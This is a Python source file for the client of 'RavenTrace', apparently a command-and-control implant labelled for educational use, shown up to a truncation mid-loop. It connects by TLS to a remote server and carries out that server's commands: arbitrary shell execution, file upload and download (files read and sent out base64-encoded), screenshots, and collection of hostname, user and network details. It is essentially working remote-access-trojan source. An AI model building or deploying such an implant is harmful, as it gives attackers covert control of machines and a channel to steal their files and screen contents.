#!/usr/bin/env python3
"""
RavenTrace - Client Module

This module implements a secure client for RavenTrace, allowing secure
communication with the command and control server over SSL/TLS with
proper authentication and encryption.

Author: RavenTrace Team
Version: 1.0.0
License: Educational Use Only
"""

import argparse
import json
import logging
import os
import platform
import socket
import ssl
import subprocess
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple, Union, Callable

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("raventrace_client.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("raventrace.client")


@dataclass
class ClientConfig:
    """Configuration dataclass for the RavenTrace client."""
    server_host: str
    server_port: int = 8443
    cert_file: Optional[str] = None
    key_file: Optional[str] = None
    ca_file: Optional[str] = None
    verify_ssl: bool = True
    reconnect_interval: int = 30
    max_reconnect_attempts: int = 10
    heartbeat_interval: int = 60
    log_file: str = "raventrace_client.log"


class CommandExecutor:
    """
    Command executor for the RavenTrace client.
    
    This class handles the execution of commands received from the server.
    """
    
    def __init__(self):
        """Initialize the command executor."""
        # Register command handlers
        self.command_handlers = {
            "shell": self._handle_shell_command,
            "upload": self._handle_upload_command,
            "download": self._handle_download_command,
            "info": self._handle_info_command,
            "screenshot": self._handle_screenshot_command,
            "exit": self._handle_exit_command
        }
        
    def execute_command(self, command: Dict) -> Dict:
        """
        Execute a command.
        
        Args:
            command: The command to execute
            
        Returns:
            Dict: The command result
        """
        try:
            # Extract command type
            command_type = command.get("type")
            
            if not command_type:
                return {
                    "status": "error",
                    "message": "Missing command type"
                }
                
            # Get command handler
            handler = self.command_handlers.get(command_type)
            
            if not handler:
                return {
                    "status": "error",
                    "message": f"Unsupported command type: {command_type}"
                }
                
            # Execute command
            return handler(command)
            
        except Exception as e:
            logger.error(f"Error executing command: {e}")
            return {
                "status": "error",
                "message": f"Command execution error: {str(e)}"
            }
            
    def _handle_shell_command(self, command: Dict) -> Dict:
        """
        Handle a shell command.
        
        Args:
            command: The shell command
            
        Returns:
            Dict: The command result
        """
        try:
            # Extract command
            shell_command = command.get("command")
            
            if not shell_command:
                return {
                    "status": "error",
                    "message": "Missing shell command"
                }
                
            # Execute command
            logger.info(f"Executing shell command: {shell_command}")
            
            # Use subprocess to execute command
            process = subprocess.run(
                shell_command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=command.get("timeout", 60)
            )
            
            # Return result
            return {
                "status": "success",
                "exit_code": process.returncode,
                "stdout": process.stdout,
                "stderr": process.stderr
            }
            
        except subprocess.TimeoutExpired:
            return {
                "status": "error",
                "message": "Command timed out"
            }
        except Exception as e:
            logger.error(f"Error executing shell command: {e}")
            return {
                "status": "error",
                "message": f"Shell command error: {str(e)}"
            }
            
    def _handle_upload_command(self, command: Dict) -> Dict:
        """
        Handle a file upload command.
        
        Args:
            command: The upload command
            
        Returns:
            Dict: The command result
        """
        try:
            # Extract file data and path
            file_data = command.get("data")
            file_path = command.get("path")
            
            if not file_data or not file_path:
                return {
                    "status": "error",
                    "message": "Missing file data or path"
                }
                
            # Decode file data
            try:
                import base64
                decoded_data = base64.b64decode(file_data)
            except Exception as e:
                return {
                    "status": "error",
                    "message": f"Invalid file data: {str(e)}"
                }
                
            # Write file
            try:
                # Create directory if it doesn't exist
                os.makedirs(os.path.dirname(os.path.abspath(file_path)), exist_ok=True)
                
                with open(file_path, "wb") as f:
                    f.write(decoded_data)
                    
                logger.info(f"Uploaded file to {file_path}")
                
                return {
                    "status": "success",
                    "message": f"File uploaded to {file_path}",
                    "size": len(decoded_data)
                }
            except Exception as e:
                return {
                    "status": "error",
                    "message": f"Error writing file: {str(e)}"
                }
                
        except Exception as e:
            logger.error(f"Error handling upload command: {e}")
            return {
                "status": "error",
                "message": f"Upload error: {str(e)}"
            }
            
    def _handle_download_command(self, command: Dict) -> Dict:
        """
        Handle a file download command.
        
        Args:
            command: The download command
            
        Returns:
            Dict: The command result
        """
        try:
            # Extract file path
            file_path = command.get("path")
            
            if not file_path:
                return {
                    "status": "error",
                    "message": "Missing file path"
                }
                
            # Read file
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()
                    
                # Encode file data
                import base64
                encoded_data = base64.b64encode(file_data).decode("utf-8")
                
                logger.info(f"Downloaded file from {file_path}")
                
                return {
                    "status": "success",
                    "message": f"File downloaded from {file_path}",
                    "size": len(file_data),
                    "data": encoded_data,
                    "filename": os.path.basename(file_path)
                }
            except FileNotFoundError:
                return {
                    "status": "error",
                    "message": f"File not found: {file_path}"
                }
            except Exception as e:
                return {
                    "status": "error",
                    "message": f"Error reading file: {str(e)}"
                }
                
        except Exception as e:
            logger.error(f"Error handling download command: {e}")
            return {
                "status": "error",
                "message": f"Download error: {str(e)}"
            }
            
    def _handle_info_command(self, command: Dict) -> Dict:
        """
        Handle an information command.
        
        Args:
            command: The info command
            
        Returns:
            Dict: The command result
        """
        try:
            # Collect system information
            info = {
                "hostname": socket.gethostname(),
                "platform": platform.platform(),
                "system": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "username": os.getlogin(),
                "pid": os.getpid(),
                "cwd": os.getcwd(),
                "python_version": platform.python_version(),
                "time": datetime.now().isoformat()
            }
            
            # Add network interfaces
            try:
                import netifaces
                interfaces = {}
                
                for interface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(interface)
                    
                    if netifaces.AF_INET in addrs:
                        interfaces[interface] = {
                            "ipv4": addrs[netifaces.AF_INET][0]["addr"],
                            "netmask": addrs[netifaces.AF_INET][0]["netmask"]
                        }
                        
                        if netifaces.AF_LINK in addrs:
                            interfaces[interface]["mac"] = addrs[netifaces.AF_LINK][0]["addr"]
                            
                info["interfaces"] = interfaces
            except ImportError:
                # netifaces not available
                pass
                
            logger.info("Collected system information")
            
            return {
                "status": "success",
                "info": info
            }
            
        except Exception as e:
            logger.error(f"Error handling info command: {e}")
            return {
                "status": "error",
                "message": f"Info error: {str(e)}"
            }
            
    def _handle_screenshot_command(self, command: Dict) -> Dict:
        """
        Handle a screenshot command.
        
        Args:
            command: The screenshot command
            
        Returns:
            Dict: The command result
        """
        try:
            # Check if PIL is available
            try:
                from PIL import ImageGrab
            except ImportError:
                return {
                    "status": "error",
                    "message": "Screenshot functionality requires PIL/Pillow"
                }
                
            # Take screenshot
            try:
                screenshot = ImageGrab.grab()
                
                # Save to temporary file
                import tempfile
                import base64
                
                with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as temp:
                    temp_path = temp.name
                    screenshot.save(temp_path)
                    
                # Read and encode screenshot
                with open(temp_path, "rb") as f:
                    screenshot_data = f.read()
                    
                # Clean up temporary file
                os.unlink(temp_path)
                
                # Encode screenshot data
                encoded_data = base64.b64encode(screenshot_data).decode("utf-8")
                
                logger.info("Captured screenshot")
                
                return {
                    "status": "success",
                    "message": "Screenshot captured",
                    "size": len(screenshot_data),
                    "data": encoded_data,
                    "width": screenshot.width,
                    "height": screenshot.height
                }
            except Exception as e:
                return {
                    "status": "error",
                    "message": f"Error capturing screenshot: {str(e)}"
                }
                
        except Exception as e:
            logger.error(f"Error handling screenshot command: {e}")
            return {
                "status": "error",
                "message": f"Screenshot error: {str(e)}"
            }
            
    def _handle_exit_command(self, command: Dict) -> Dict:
        """
        Handle an exit command.
        
        Args:
            command: The exit command
            
        Returns:
            Dict: The command result
        """
        try:
            # Return success and set exit flag
            logger.info("Received exit command")
            
            return {
                "status": "success",
                "message": "Client exiting",
                "exit": True
            }
            
        except Exception as e:
            logger.error(f"Error handling exit command: {e}")
            return {
                "status": "error",
                "message": f"Exit error: {str(e)}"
            }


class RavenTraceClient:
    """
    Main client class for RavenTrace.
    
    This class implements a secure client for communicating with the
    RavenTrace command and control server.
    """
    
    def __init__(self, config: ClientConfig):
        """
        Initialize the client with the given configuration.
        
        Args:
            config: Client configuration
        """
        self.config = config
        self.socket = None
        self.ssl_socket = None
        self.ssl_context = None
        self.running = False
        self.authenticated = False
        self.client_id = None
        self.command_executor = CommandExecutor()
        self.reconnect_attempts = 0
        self.last_heartbeat = time.time()
        
    def start(self) -> None:
        """Start the client."""
        try:
            # Set running flag
            self.running = True
            
            # Connect to server
            self._connect()
            
            # Main loop
            while self.running:
                try:
                    # Check if connected
                    if not self.ssl_socket:
                        # Attempt to reconnect
                        if not self._reconnect():
                            break
                            
                    # Check if authenticated
                    if not self.authenticated:
                        # Attempt to authenticate
                        if not self._authenticate():
                            # Authentication failed, reconnect
                            self._disconnect()
                            continue
                            
                    # Check if heartbeat is needed
                    if time.time() - self.last_heartbeat > self.config.heartbeat_interval:
                        self._send_heartbeat()
                        
                    # Receive and process command
                    command = self._receive_message()
                    
                    if command:
                        # Execute command
                        result = self.command_executor.execute_command(command)
                        
                        # Send result
                     
(Content truncated due to size limit. Use line ranges to read in chunks)